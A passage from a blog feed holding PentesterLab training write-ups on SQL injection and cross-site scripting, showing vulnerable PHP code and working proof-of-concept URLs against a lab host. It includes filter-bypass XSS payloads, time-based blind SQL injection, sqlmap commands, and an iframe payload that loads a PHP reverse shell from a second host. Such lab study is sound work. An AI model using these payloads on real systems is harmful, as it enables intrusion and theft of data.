<p><code>http://10.10.10.129/sqli/example7.php?id=2 or 123=%0a123</code></p>

<p><code>http://10.10.10.129/sqli/example7.php?id=2 or %0a123=%0a123</code></p>

<p>SQLMAP exploit:</p>

<p><code>sqlmap -u "http://10.10.10.129/sqli/example7.php?id=2%0a*" --dbs</code></p>

<h2>Example 8</h2>

<p>Code review:
<figure class='code'><figcaption><span>example8.php </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">?</span><span class="nx">php</span>
</span><span class='line'>    <span class="o">&amp;</span><span class="nx">hellip</span><span class="p">;</span> <span class="o">&amp;</span><span class="nx">hellip</span><span class="p">;</span>
</span><span class='line'>    <span class="nv">$sql</span> <span class="o">=</span> <span class="o">&amp;</span><span class="nx">ldquo</span><span class="p">;</span><span class="nx">SELECT</span> <span class="o">*</span> <span class="nx">FROM</span> <span class="nx">users</span> <span class="nx">ORDER</span> <span class="nx">BY</span> <span class="o">&lt;</span><span class="nx">code</span><span class="o">&gt;</span><span class="s2">&quot;;</span>
</span><span class='line'><span class="s2">    </span><span class="si">$sql</span><span class="s2"> .= mysql_real_escape_string(</span><span class="si">$_GET[&quot;order&quot;]</span><span class="s2">).&quot;</span><span class="o">&lt;/</span><span class="nx">code</span><span class="o">&gt;&amp;</span><span class="nx">rdquo</span><span class="p">;;</span>
</span><span class='line'>    <span class="nv">$result</span> <span class="o">=</span> <span class="nb">mysql_query</span><span class="p">(</span><span class="nv">$sql</span><span class="p">);</span>
</span><span class='line'>    <span class="o">&amp;</span><span class="nx">hellip</span><span class="p">;</span> <span class="o">&amp;</span><span class="nx">hellip</span><span class="p">;</span>
</span><span class='line'><span class="cp">?&gt;</span><span class="x"></span>
</span></code></pre></td></tr></table></div></figure></p>

<p>From the source code above, we need to inject payload into &ldquo;<em>order by</em>&rdquo; statement. Due to the function &ldquo;<em>extractvalue</em>&rdquo; does not work here, the error information will not display, I have to choose <a href="http://www.securityidiots.com/Web-Pentest/SQL-Injection/group-by-and-order-by-sql-injection.html#blind">Time-based blind injection</a>.</p>

<p>PoC:</p>

<p>// the page will delay 5 seconds, it means the first character of database() is &lsquo;e&rsquo;
<code>http://10.10.10.129/sqli/example8.php?order=id</code>,(select sleep(5) from dual where ASCII(substring(database(),1,1)) = 101)%23`</p>

<p>// the page will display immediately, it means the first character of database() is not &lsquo;f&rsquo;
<code>http://10.10.10.129/sqli/example8.php?order=id</code>,(select sleep(5) from dual where ASCII(substring(database(),1,1)) = 102)%23`</p>

<p>Here I use mysql default null table <a href="http://en.wikipedia.org/wiki/DUAL_table">DUAL</a> to construct the payload.</p>

<p>SQLMAP exploit:</p>

<p><code>sqlmap -u "http://10.10.10.129/sqli/example8.php?order=id%60*" --dbs --batch</code></p>

<h2>Example 9</h2>

<p>Code review:
<figure class='code'><figcaption><span>example9.php </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">?</span><span class="nx">php</span>
</span><span class='line'>    <span class="o">&amp;</span><span class="nx">hellip</span><span class="p">;</span> <span class="o">&amp;</span><span class="nx">hellip</span><span class="p">;</span>
</span><span class='line'>    <span class="nv">$sql</span> <span class="o">=</span> <span class="o">&amp;</span><span class="nx">ldquo</span><span class="p">;</span><span class="nx">SELECT</span> <span class="o">*</span> <span class="nx">FROM</span> <span class="nx">users</span> <span class="nx">ORDER</span> <span class="nx">BY</span> <span class="o">&amp;</span><span class="nx">rdquo</span><span class="p">;;</span>
</span><span class='line'>    <span class="nv">$sql</span> <span class="o">.=</span> <span class="nb">mysql_real_escape_string</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="o">&amp;</span><span class="nx">ldquo</span><span class="p">;</span><span class="nx">order</span><span class="o">&amp;</span><span class="nx">rdquo</span><span class="p">;]);</span>
</span><span class='line'>    <span class="nv">$result</span> <span class="o">=</span> <span class="nb">mysql_query</span><span class="p">(</span><span class="nv">$sql</span><span class="p">);</span>
</span><span class='line'>    <span class="o">&amp;</span><span class="nx">hellip</span><span class="p">;</span> <span class="o">&amp;</span><span class="nx">hellip</span><span class="p">;</span>
</span><span class='line'><span class="cp">?&gt;</span><span class="x"></span>
</span></code></pre></td></tr></table></div></figure></p>

<p>Thanks to there is no back-tick (`), we have more options to exploit &ldquo;ORDER BY&rdquo; injection. rather than time-based blind injection, we can use <a href="http://dev.mysql.com/doc/refman/5.0/en/control-flow-functions.html#function_if">IF function</a> to construct error-based injection here.</p>

<p>PoC:</p>

<p>// the page will order by name, it means the first character of database() is &lsquo;e&rsquo;
<code>http://10.10.10.129/sqli/example9.php?order=if((ASCII(substring(database(),1,1))=101),name,age)</code></p>

<p>// the page will order by age, it means the first character of database() is not &lsquo;f&rsquo;
<code>http://10.10.10.129/sqli/example9.php?order=if((ASCII(substring(database(),1,1))=102),name,age)</code></p>

<p>SQLMAP exploit:</p>

<p><code>sqlmap -u "http://10.10.10.129/sqli/example9.php?order=id" --dbs --batch</code></p>

<p>To be continued&hellip;</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[[PentesterLab] Web for Pentester - XSS]]></title>
    <link href="http://f4l13n5n0w.github.io/blog/2015/05/21/pentesterlab-web-for-pentester-xss/"/>
    <updated>2015-05-21T07:11:45-04:00</updated>
    <id>http://f4l13n5n0w.github.io/blog/2015/05/21/pentesterlab-web-for-pentester-xss</id>
    <content type="html"><![CDATA[<p>&ldquo;This course details all you need to know to start doing web penetration testing. PentesterLab tried to put together the basics of web testing and a summary of the most common vulnerabilities with the LiveCD to test them.&rdquo; &ndash; PentesterLab</p>

<p>Due to this is quite a long course, I have to divide the course into several parts and this one is focus on Cross Site Script attack which is well known as XSS. More information and ISO download please check <a href="https://www.pentesterlab.com/exercises/web_for_pentester/">here</a>. The official <a href="https://www.pentesterlab.com/exercises/web_for_pentester/course">course</a> is highly recommanded to read.</p>

<p>Difficulty: 1 / 5</p>

<!-- more -->


<h2>Example 1</h2>

<p>Code review:
<figure class='code'><figcaption><span>example1.php </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">?</span><span class="nx">php</span> <span class="k">require_once</span> <span class="o">&amp;</span><span class="nx">lsquo</span><span class="p">;</span><span class="o">../</span><span class="nb">header</span><span class="o">.</span><span class="nx">php</span><span class="o">&amp;</span><span class="nx">rsquo</span><span class="p">;;</span> <span class="cp">?&gt;</span><span class="x"></span>
</span><span class='line'><span class="x">&lt;html&gt;</span>
</span><span class='line'><span class="x">Hello</span>
</span><span class='line'><span class="x">&amp;lt;?php</span>
</span><span class='line'><span class="x">    echo $_GET[&amp;ldquo;name&amp;rdquo;];</span>
</span><span class='line'><span class="x">?&gt;</span>
</span><span class='line'><span class="x">&amp;lt;?php require_once &amp;lsquo;../footer.php&amp;rsquo;; ?&gt;</span>
</span></code></pre></td></tr></table></div></figure></p>

<p>There is no input validation, so I can exploit it directly with the classic &ldquo;<font color="red"><em>alert(1)</em></font>&rdquo; injection.</p>

<p>PoC:</p>

<p><code>http://10.10.10.129/xss/example1.php?name=&lt;script&gt;alert(1);&lt;/script&gt;</code></p>

<h2>Example 2</h2>

<p>Code review:
<figure class='code'><figcaption><span>example2.php </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">?</span><span class="nx">php</span> <span class="k">require_once</span> <span class="o">&amp;</span><span class="nx">lsquo</span><span class="p">;</span><span class="o">../</span><span class="nb">header</span><span class="o">.</span><span class="nx">php</span><span class="o">&amp;</span><span class="nx">rsquo</span><span class="p">;;</span> <span class="cp">?&gt;</span><span class="x"></span>
</span><span class='line'><span class="x">Hello</span>
</span><span class='line'><span class="x">&amp;lt;?php</span>
</span><span class='line'><span class="x">    $name =  $_GET[&amp;ldquo;name&amp;rdquo;];</span>
</span><span class='line'><span class="x">    $name = preg_replace(&amp;ldquo;/&lt;script&gt;/&amp;rdquo;,&amp;ldquo;&amp;rdquo;, $name);</span>
</span><span class='line'><span class="x">    $name = preg_replace(&amp;ldquo;/&amp;lt;\/script&gt;/&amp;rdquo;,&amp;ldquo;&amp;rdquo;, $name);</span>
</span><span class='line'><span class="x">echo $name;</span>
</span><span class='line'><span class="x">?&gt;</span>
</span><span class='line'><span class="x">&amp;lt;?php require_once &amp;lsquo;../footer.php&amp;rsquo;; ?&gt;</span>
</span></code></pre></td></tr></table></div></figure></p>

<p>From the source code above, the developer filtered <code>&lt;script&gt;</code> and <code>&lt;/script&gt;</code>. This is a sort of black list technique but only avoid one very specific situation. It can be bypassed easily by using upper letters or recursion. for example, both <code>&lt;sCript&gt;alert(1)&lt;/sCript&gt;</code> and <code>&lt;scr&lt;script&gt;ipt&gt;alert(1)&lt;/scr&lt;/script&gt;ipt&gt;</code> are working perfectly.</p>

<p>PoC:</p>

<p><code>http://10.10.10.129/xss/example2.php?name=&lt;sCript&gt;alert(1)&lt;/sCript&gt;</code></p>

<p><code>http://10.10.10.129/xss/example2.php?name=&lt;scr&lt;script&gt;ipt&gt;alert(1)&lt;/scr&lt;/script&gt;ipt&gt;</code></p>

<h2>Example 3</h2>

<p>Code review:
<figure class='code'><figcaption><span>example3.php </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">?</span><span class="nx">php</span> <span class="k">require_once</span> <span class="o">&amp;</span><span class="nx">lsquo</span><span class="p">;</span><span class="o">../</span><span class="nb">header</span><span class="o">.</span><span class="nx">php</span><span class="o">&amp;</span><span class="nx">rsquo</span><span class="p">;;</span> <span class="cp">?&gt;</span><span class="x"></span>
</span><span class='line'><span class="x">Hello</span>
</span><span class='line'><span class="x">&amp;lt;?php</span>
</span><span class='line'><span class="x">    $name =  $_GET[&amp;ldquo;name&amp;rdquo;];</span>
</span><span class='line'><span class="x">    $name = preg_replace(&amp;ldquo;/&lt;script&gt;/i&amp;rdquo;,&amp;ldquo;&amp;rdquo;, $name);</span>
</span><span class='line'><span class="x">    $name = preg_replace(&amp;ldquo;/&amp;lt;\/script&gt;/i&amp;rdquo;,&amp;ldquo;&amp;rdquo;, $name);</span>
</span><span class='line'><span class="x">echo $name;</span>
</span><span class='line'><span class="x">?&gt;</span>
</span><span class='line'><span class="x">&amp;lt;?php require_once &amp;lsquo;../footer.php&amp;rsquo;; ?&gt;</span>
</span></code></pre></td></tr></table></div></figure></p>

<p>This time the developer use PCRE modifier &ldquo;i&rdquo; (<em>PCRE_CASELESS</em>) to match both upper and lower case letters. However, recursion method still works fine.</p>

<p>PoC:</p>

<p><code>http://10.10.10.129/xss/example3.php?name=&lt;scr&lt;script&gt;ipt&gt;alert(1)&lt;/scr&lt;/script&gt;ipt&gt;</code></p>

<h2>Example 4</h2>

<p><figure class='code'><figcaption><span>example4.php </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">?</span><span class="nx">php</span> <span class="k">require_once</span> <span class="o">&amp;</span><span class="nx">lsquo</span><span class="p">;</span><span class="o">../</span><span class="nb">header</span><span class="o">.</span><span class="nx">php</span><span class="o">&amp;</span><span class="nx">rsquo</span><span class="p">;;</span><span class="o">&lt;/</span><span class="nx">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="nx">p</span><span class="o">&gt;</span><span class="k">if</span> <span class="p">(</span><span class="nb">preg_match</span><span class="p">(</span><span class="o">&amp;</span><span class="nx">lsquo</span><span class="p">;</span><span class="o">/</span><span class="nx">script</span><span class="o">/</span><span class="nx">i</span><span class="o">&amp;</span><span class="nx">rsquo</span><span class="p">;,</span> <span class="nv">$_GET</span><span class="p">[</span><span class="o">&amp;</span><span class="nx">ldquo</span><span class="p">;</span><span class="nx">name</span><span class="o">&amp;</span><span class="nx">rdquo</span><span class="p">;]))</span> <span class="p">{</span>
</span><span class='line'>  <span class="k">die</span><span class="p">(</span><span class="o">&amp;</span><span class="nx">ldquo</span><span class="p">;</span><span class="nx">error</span><span class="o">&amp;</span><span class="nx">rdquo</span><span class="p">;);</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'><span class="cp">?&gt;</span><span class="x">&lt;/p&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="x">&lt;p&gt;Hello &amp;lt;?php  echo $_GET[&amp;ldquo;name&amp;rdquo;]; ?&gt;</span>
</span><span class='line'><span class="x">&amp;lt;?php require_once &amp;lsquo;../footer.php&amp;rsquo;; ?&gt;&lt;br/&gt;</span>
</span></code></pre></td></tr></table></div></figure></p>

<p>This time the script will stop when &ldquo;<em>script</em>&rdquo; is detected, so the previous methods will not work any more. However there are plenty of methods available in HTML to trigger an event without &ldquo;<em>script</em>&rdquo;, there are two examples as follow.</p>

<p>PoC:</p>

<p><code>http://10.10.10.129/xss/example4.php?name=&lt;img src="xxxx" onerror="alert(1)"&gt;</code></p>

<p><code>http://10.10.10.129/xss/example4.php?name=&lt;div onmousemove="alert(1)" src="xxxx"&gt;</code></p>

<p>There are more <a href="http://www.w3schools.com/tags/ref_eventattributes.asp">event triggers</a> available in HTML.</p>

<h2>Example 5</h2>

<p>Code review:
<figure class='code'><figcaption><span>example5.php </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">?</span><span class="nx">php</span> <span class="k">require_once</span> <span class="o">&amp;</span><span class="nx">lsquo</span><span class="p">;</span><span class="o">../</span><span class="nb">header</span><span class="o">.</span><span class="nx">php</span><span class="o">&amp;</span><span class="nx">rsquo</span><span class="p">;;</span><span class="o">&lt;/</span><span class="nx">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="nx">p</span><span class="o">&gt;</span><span class="k">if</span> <span class="p">(</span><span class="nb">preg_match</span><span class="p">(</span><span class="o">&amp;</span><span class="nx">lsquo</span><span class="p">;</span><span class="o">/</span><span class="nx">alert</span><span class="o">/</span><span class="nx">i</span><span class="o">&amp;</span><span class="nx">rsquo</span><span class="p">;,</span> <span class="nv">$_GET</span><span class="p">[</span><span class="o">&amp;</span><span class="nx">ldquo</span><span class="p">;</span><span class="nx">name</span><span class="o">&amp;</span><span class="nx">rdquo</span><span class="p">;]))</span> <span class="p">{</span>
</span><span class='line'>  <span class="k">die</span><span class="p">(</span><span class="o">&amp;</span><span class="nx">ldquo</span><span class="p">;</span><span class="nx">error</span><span class="o">&amp;</span><span class="nx">rdquo</span><span class="p">;);</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'><span class="cp">?&gt;</span><span class="x">&lt;/p&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="x">&lt;p&gt;Hello &amp;lt;?php  echo $_GET[&amp;ldquo;name&amp;rdquo;]; ?&gt;</span>
</span><span class='line'><span class="x">&amp;lt;?php require_once &amp;lsquo;../footer.php&amp;rsquo;; ?&gt;</span>
</span></code></pre></td></tr></table></div></figure></p>

<p>This time the developer filtered keyword &ldquo;<em>alert</em>&rdquo;, obviously there are many methods to exploit the vulnerability without using &ldquo;<em>alert</em>&rdquo; function.
such as:</p>

<p><code>http://10.10.10.129/xss/example5.php?name=&lt;iframe width=0 height=0 src="http://10.10.10.131/sh5555.php"&gt;</code></p>

<p>Here <strong><em>sh5555.php</em></strong> is PHP reverse shell (php/reverse_php, LPORT is 5555) generated by msfpayload.</p>

<p>Still, there are methods to bypass input validation to use &ldquo;<em>alert</em>&rdquo; function.</p>

<p>PoC:</p>

<p><code>http://10.10.10.129/xss/example5.php?name=&lt;script&gt;eval(String.fromCharCode(97,108,101,114,116,40,49,41))&lt;/script&gt;</code></p>

<p><code>http://10.10.10.129/xss/example5.php?name=&lt;script&gt;confirm(1)&lt;/script&gt;</code></p>

<p><code>http://10.10.10.129/xss/example5.php?name=&lt;script&gt;prompt(1)&lt;/script&gt;</code></p>

<h2>Example 6</h2>

<p><figure class='code'><figcaption><span>example6.php </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">?</span><span class="nx">php</span> <span class="k">require_once</span> <span class="o">&amp;</span><span class="nx">lsquo</span><span class="p">;</span><span class="o">../</span><span class="nb">header</span><span class="o">.</span><span class="nx">php</span><span class="o">&amp;</span><span class="nx">rsquo</span><span class="p">;;</span> <span class="cp">?&gt;</span><span class="x"></span>
</span><span class='line'><span class="x">Hello&lt;/p&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="x">&lt;script&gt;</span>
</span><span class='line'><span class="x">    var $a= &quot;</span><span class="cp">&lt;?php</span>  <span class="k">echo</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s2">&quot;name&quot;</span><span class="p">];</span> <span class="cp">?&gt;</span><span class="x">&quot;;</span>
</span><span class='line'><span class="x">&lt;/script&gt;</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'><span class="x">&lt;pre&gt;&lt;code&gt;&amp;lt;?php require_once &#39;../footer.php&#39;; ?&amp;gt;</span>
</span><span class='line'><span class="x">&lt;/code&gt;&lt;/pre&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="x">&lt;p&gt;</span>
</span></code></pre></td></tr></table></div></figure></p>

<p>This time user input has been included in &ldquo;<code>&lt;script&gt;</code>&rdquo; tab, so we do not need input &ldquo;<code>&lt;script&gt;</code>&rdquo; and just close the first double quote and use &ldquo;//&rdquo; to comment the following strings.</p>

<p>PoC:</p>

<p><code>http://10.10.10.129/xss/example6.php?name=";alert(1);//</code></p>

<h2>Example 7</h2>

<p><figure class='code'><figcaption><span>example7.php </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">?</span><span class="nx">php</span> <span class="k">require_once</span> <span class="o">&amp;</span><span class="nx">lsquo</span><span class="p">;</span><span class="o">../</span><span class="nb">header</span><span class="o">.</span><span class="nx">php</span><span class="o">&amp;</span><span class="nx">rsquo</span><span class="p">;;</span> <span class="cp">?&gt;</span><span class="x"></span>
</span><span class='line'><span class="x">Hello&lt;/p&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="x">&lt;script&gt;</span>
</span><span class='line'><span class="x">    var $a= &#39;</span><span class="cp">&lt;?php</span>  <span class="k">echo</span> <span class="nb">htmlentities</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s2">&quot;name&quot;</span><span class="p">]);</span> <span class="cp">?&gt;</span><span class="x">&#39;;</span>
</span><span class='line'><span class="x">&lt;/script&gt;</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'><span class="x">&lt;p&gt;&amp;lt;?php require_once &amp;lsquo;../footer.php&amp;rsquo;; ?&gt;</span>
</span></code></pre></td></tr></table></div></figure></p>

<p>This time the developer use PHP function &ldquo;<em><a href="http://php.net/htmlentities">htmlentities()</a></em>&rdquo; to deal with user input, the &ldquo;<em>htmlentities()</em>&rdquo; function will encode special characters which will break the XSS injection. However, the developer did not indicate any flags to function &ldquo;<em>htmlentities()</em>&rdquo; which default only use flags &ldquo;<strong>ENT_COMPAT | ENT_HTML401</strong>&rdquo;, &ldquo;<a href="http://php.net/htmlentities">ENT_COMPAT</a>&rdquo; flag only convert double quotes and leave single quotes alone. So in this case, the following payload will work fine:</p>

<p>PoC:</p>

<p><code>http://10.10.10.129/xss/example7.php?name=';alert(1);//</code></p>

<h2>Example 8</h2>

<p><figure class='code'><figcaption><span>example8.php </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">?</span><span class="nx">php</span>
</span><span class='line'>  <span class="k">require_once</span> <span class="o">&amp;</span><span class="nx">lsquo</span><span class="p">;</span><span class="o">../</span><span class="nb">header</span><span class="o">.</span><span class="nx">php</span><span class="o">&amp;</span><span class="nx">rsquo</span><span class="p">;;</span><span class="o">&lt;/</span><span class="nx">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="nx">p</span><span class="o">&gt;</span>  <span class="k">if</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="err">$</span><span class="o">&lt;</span><span class="nx">em</span><span class="o">&gt;</span><span class="nx">POST</span><span class="p">[</span><span class="o">&amp;</span><span class="nx">ldquo</span><span class="p">;</span><span class="nx">name</span><span class="o">&amp;</span><span class="nx">rdquo</span><span class="p">;]))</span> <span class="p">{</span>
</span><span class='line'>    <span class="k">echo</span> <span class="o">&amp;</span><span class="nx">ldquo</span><span class="p">;</span><span class="nx">HELLO</span> <span class="o">&amp;</span><span class="nx">rdquo</span><span class="p">;</span><span class="o">.</span><span class="nb">htmlentities</span><span class="p">(</span><span class="err">$</span><span class="o">&lt;/</span><span class="nx">em</span><span class="o">&gt;</span><span class="nx">POST</span><span class="p">[</span><span class="o">&amp;</span><span class="nx">ldquo</span><span class="p">;</span><span class="nx">name</span><span class="o">&amp;</span><span class="nx">rdquo</span><span class="p">;]);</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'><span class="cp">?&gt;</span><span class="x"></span>
</span><span class='line'><span class="x">&lt;form action=&quot;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;PHP_SELF&#39;</span><span class="p">];</span> <span class="cp">?&gt;</span><span class="x">&amp;ldquo; method=&quot;POST&amp;rdquo;&gt;</span>
</span><span class='line'><span class="x">  Your name:&lt;input type=&quot;text&quot; name=&quot;name&quot; /&gt;</span>
</span><span class='line'><span class="x">  &lt;input type=&quot;submit&quot; name=&quot;submit&quot;/&gt;&lt;/p&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="x">&lt;p&gt;&amp;lt;?php</span>
</span><span class='line'><span class="x">  require_once &amp;lsquo;../footer.php&amp;rsquo;;</span>
</span><span class='line'><span class="x">?&gt;</span>
</span></code></pre></td></tr></table></div></figure></p>

<p>This time the developer did correct validation on parameter &ldquo;<em>name</em>&rdquo;, but the problem happened on &ldquo;<em>$_SERVER[PHP_SELF]</em>&rdquo;.
Due to there is no validation on parameter &ldquo;<strong><a href="http://php.net/manual/en/reserved.variables.server.php">PHP_SELF</a></strong>&rdquo; which is controlled by user, I still can inject XSS and exploit the vulnerability.</p>

<p>PoC:</p>

<p><code>http://10.10.10.129/xss/example8.php/" onmouseover="alert(1)</code></p>

<h2>Example 9</h2>

<p><figure class='code'><figcaption><span>example9.php </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">?</span><span class="nx">php</span> <span class="k">require_once</span> <span class="o">&amp;</span><span class="nx">lsquo</span><span class="p">;</span><span class="o">../</span><span class="nb">header</span><span class="o">.</span><span class="nx">php</span><span class="o">&amp;</span><span class="nx">rsquo</span><span class="p">;;</span> <span class="cp">?&gt;</span><span class="x">&lt;/p&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="x">&lt;script&gt;</span>
</span><span class='line'><span class="x">  document.write(location.hash.substring(1));</span>
</span><span class='line'><span class="x">&lt;/script&gt;</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'><span class="x">&lt;p&gt;&amp;lt;?php require_once &amp;lsquo;../footer.php&amp;rsquo;; ?&gt;</span>
</span></code></pre></td></tr></table></div></figure></p>

<p>This time is <a href="https://www.owasp.org/index.php/DOM_Based_XSS">DOM-based XSS</a>. the user input is in URL after &ldquo;#&rdquo;, so just put payload after &ldquo;#&rdquo; in URL will trigger the vulnerability.</p>

<p>PoC:</p>

<p><code>http://10.10.10.129/xss/example9.php#&lt;script&gt;alert(1)&lt;/script&gt;</code></p>

<p>Reference:</p>

<p>[1] <a href="https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet#HTML_entities"><em>XSS Filter Evasion Cheat Sheet</em></a></p>

<p>To be continued&hellip;</p>
]]></content>
  </entry>
  
</feed>
